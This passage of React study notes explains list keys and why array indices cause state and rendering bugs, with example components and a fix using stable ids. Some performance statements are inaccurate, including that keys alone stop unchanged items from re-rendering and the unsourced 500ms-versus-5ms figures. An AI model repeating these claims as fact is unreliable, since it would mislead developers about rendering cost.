          {item.text}
          <button onClick={() => removeItem(item.id)}>Delete</button>
          <button onClick={() => moveUp(index)}>Move Up</button>
        </li>
      ))}
      <button onClick={addItem}>Add Item</button>
    </ul>
  );
}

Keys and Performance:
---------------------

// Keys enable efficient reconciliation [web:144]

// Bad performance (no keys):
function SlowList({ items }) {
  return items.map(item => <ExpensiveComponent data={item} />);
  // Every update re-renders ALL components
}

// Good performance (with keys): [web:144]
function FastList({ items }) {
  return items.map(item => (
    <ExpensiveComponent key={item.id} data={item} />
  ));
  // Only changed items re-render [web:144]
}

// Example measurement:
// 1000 items, remove first item:
// - Without keys: ~500ms (re-renders all)
// - With keys: ~5ms (removes one) [web:144]

Summary:

Keys in Lists:
- Identify elements across renders [web:144]
- Enable efficient reconciliation [web:144]
- Must be unique among siblings [web:144]
- Must be stable (don't change) [web:144]
- Preserve component state [web:144]
- Optimize reordering [web:144]
- Improve add/remove performance [web:144]
- Use database IDs when possible [web:144]
*/


/**
115. Why should keys not be array indices in lists?
--------------------------------------------------

Using array indices as keys causes problems when the list can be reordered,
filtered, or have items added/removed, leading to bugs with component state
and poor performance.

The Problem with Index Keys:
-----------------------------

// ❌ Bad: Using array indices
function TodoList({ todos }) {
  return (
    <ul>
      {todos.map((todo, index) => (
        <li key={index}>{todo.text}</li>
      ))}
    </ul>
  );
}

// Looks fine, but causes issues when list changes

Issues with Index Keys:
-----------------------

// Issue 1: Deleting items causes wrong updates

// Initial state:
const todos = ['Apple', 'Banana', 'Cherry'];

// Render:
<li key={0}>Apple</li>    // index 0
<li key={1}>Banana</li>   // index 1
<li key={2}>Cherry</li>   // index 2

// Delete "Banana":
const todos = ['Apple', 'Cherry'];

// New render:
<li key={0}>Apple</li>    // index 0 (same key)
<li key={1}>Cherry</li>   // index 1 (same key as Banana!)

// React's reconciliation:
// key={0}: Apple → Apple (no change)
// key={1}: Banana → Cherry (UPDATE TEXT!) ❌
// key={2}: Missing (REMOVE NODE)

// Problem: Cherry re-renders unnecessarily!
// Should just remove Banana, but React updates Cherry instead

// Issue 2: Component state gets mixed up

function TodoItem({ text }) {
  const [isChecked, setIsChecked] = useState(false);
  
  return (
    <li>
      <input
        type="checkbox"
        checked={isChecked}
        onChange={(e) => setIsChecked(e.target.checked)}
      />
      {text}
    </li>
  );
}

// Initial:
<TodoItem key={0} text="Task A" />  // User checks this
<TodoItem key={1} text="Task B" />
<TodoItem key={2} text="Task C" />

// User checks "Task A" → isChecked = true for key={0}

// Delete "Task A":
<TodoItem key={0} text="Task B" />  // Now has Task A's state!
<TodoItem key={1} text="Task C" />

// Bug: "Task B" appears checked because it has key={0} now
// React preserved the state of key={0}, but the item changed!

Real-World Bug Example:
-----------------------

// Input state bug

function EditableList({ items }) {
  return (
    <ul>
      {items.map((item, index) => (
        <EditableItem key={index} item={item} />
      ))}
    </ul>
  );
}

function EditableItem({ item }) {
  const [value, setValue] = useState(item.name);
  
  return (
    <li>
      <input
        value={value}
        onChange={(e) => setValue(e.target.value)}
      />
    </li>
  );
}

// Scenario:
// 1. User types in first input: "ABC"
items = [{ name: 'Item 1' }];  // key={0}, value="ABC"

// 2. Add new item at beginning:
items = [{ name: 'New Item' }, { name: 'Item 1' }];

// Now:
// key={0} → "New Item" (has value="ABC"!) ❌
// key={1} → "Item 1" (new state, value="Item 1")

// Bug: "New Item" input shows "ABC" instead of "New Item"

Reordering Bug:
---------------

// Drag and drop bug

function DraggableList({ items }) {
  return (
    <ul>
      {items.map((item, index) => (
        <DraggableItem key={index} item={item} />
      ))}
    </ul>
  );
}

function DraggableItem({ item }) {
  const [isDragging, setIsDragging] = useState(false);
  
  return (
    <li
      draggable
      onDragStart={() => setIsDragging(true)}
      onDragEnd={() => setIsDragging(false)}
      style={{ opacity: isDragging ? 0.5 : 1 }}
    >
      {item.text}
    </li>
  );
}

// Before drag:
[
  { key: 0, text: 'A', isDragging: false },
  { key: 1, text: 'B', isDragging: false },
  { key: 2, text: 'C', isDragging: false }
]

// Drag B to top:
[
  { key: 0, text: 'B', isDragging: false },  // Wrong state!
  { key: 1, text: 'A', isDragging: false },
  { key: 2, text: 'C', isDragging: false }
]

// Bug: isDragging state doesn't follow the item
// State is tied to index, not item identity

Performance Issues:
-------------------

// Indices cause unnecessary re-renders

// Before filter:
const items = [
  { id: 1, name: 'A' },  // key={0}
  { id: 2, name: 'B' },  // key={1}
  { id: 3, name: 'C' },  // key={2}
  { id: 4, name: 'D' }   // key={3}
];

// After filter (remove B):
const items = [
  { id: 1, name: 'A' },  // key={0} (same)
  { id: 3, name: 'C' },  // key={1} (was 2) ❌
  { id: 4, name: 'D' }   // key={2} (was 3) ❌
];

// With index keys:
// - A: no change
// - C: key changed from 2 to 1 → re-render
// - D: key changed from 3 to 2 → re-render
// Total: 2 re-renders

// With stable IDs:
const items = [
  { id: 1, name: 'A' },  // key="1"
  { id: 3, name: 'C' },  // key="3" (same!)
  { id: 4, name: 'D' }   // key="4" (same!)
];

// - A: no change
// - C: key unchanged → no re-render
// - D: key unchanged → no re-render
// Total: 0 re-renders ✓

When Indices Are Acceptable:
-----------------------------

// ✅ OK to use index when:

// 1. List is static (never changes)
const STATIC_ITEMS = ['About', 'Contact', 'FAQ'];

function StaticList() {
  return (
    <ul>
      {STATIC_ITEMS.map((item, index) => (
        <li key={index}>{item}</li>
      ))}
    </ul>
  );
}

// 2. List is never reordered or filtered
function ReadOnlyList({ items }) {
  // Items only appended, never removed or reordered
  return (
    <ul>
      {items.map((item, index) => (
        <li key={index}>{item}</li>
      ))}
    </ul>
  );
}

// 3. List items have no state
function SimpleList({ items }) {
  return (
    <ul>
      {items.map((item, index) => (
        <li key={index}>{item}</li>  // Just text, no state
      ))}
    </ul>
  );
}

Better Key Alternatives:
------------------------

// ✅ Best: Database ID
items.map(item => <Item key={item.id} {...item} />);

// ✅ Good: Stable unique identifier
items.map(item => <Item key={item.uuid} {...item} />);

// ✅ Good: Combination of fields
items.map(item => (
  <Item key={`${item.category}-${item.name}`} {...item} />
));

// ✅ Acceptable: Generate stable IDs
const itemsWithIds = items.map((item, index) => ({
  ...item,
  _id: `${item.name}-${index}` // Generated once
}));

// ❌ Bad: Index
items.map((item, index) => <Item key={index} {...item} />);

// ❌ Bad: Random value
items.map(item => <Item key={Math.random()} {...item} />);

Fixing Index Key Bugs:
-----------------------

// Before (buggy):
function TodoList() {
  const [todos, setTodos] = useState([
    'Task A',
    'Task B',
    'Task C'
  ]);
  
  const removeTodo = (indexToRemove) => {
    setTodos(todos.filter((_, index) => index !== indexToRemove));
  };
  
  return (
    <ul>
      {todos.map((todo, index) => (
        <li key={index}>  {/* ❌ Index key * /}
          <input type="checkbox" />
          {todo}
          <button onClick={() => removeTodo(index)}>Delete</button>
        </li>
      ))}
    </ul>
  );
}

// After (fixed):
function TodoList() {
  const [todos, setTodos] = useState([
    { id: 1, text: 'Task A' },
    { id: 2, text: 'Task B' },
    { id: 3, text: 'Task C' }
  ]);
  
  const removeTodo = (idToRemove) => {
    setTodos(todos.filter(todo => todo.id !== idToRemove));
  };
  
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>  {/* ✅ Stable ID * /}
          <input type="checkbox" />
          {todo.text}
          <button onClick={() => removeTodo(todo.id)}>Delete</button>
        </li>
      ))}
    </ul>
  );
}

Summary:

Index Keys Problems:
- State gets mixed up
- Wrong items re-render
- Performance issues
- Bugs with reordering
- Bugs with filtering
- Bugs with adding/removing
- Component state follows index, not item
- Use only for static lists
- Use stable IDs instead
- Database IDs are best
*/


